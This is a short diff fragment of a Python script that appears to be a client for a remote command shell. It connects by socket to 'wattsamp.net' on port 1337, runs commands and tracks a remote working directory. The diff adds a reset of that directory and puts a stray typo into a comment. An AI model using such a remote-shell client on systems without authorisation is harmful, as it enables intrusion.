@@ -16,7 +16,7 @@ host = "wattsamp.net" # IP address here
 port = 1337 # Port here
 path_cd = "/"
 
-#if the cmd is cd see how to return pwd back to calling function
+#if the cmd is cd see how t:o return pwd back to calling function
 def execute_cmd(cmd):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((host, port))
@@ -113,6 +113,8 @@ if __name__ == '__main__':
             else:
                 in_shell = True
                 input=""
+                global path_cd
+                path_cd="/"
                 while input!= "exit":
                     '''if path_cd=="":
                         a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
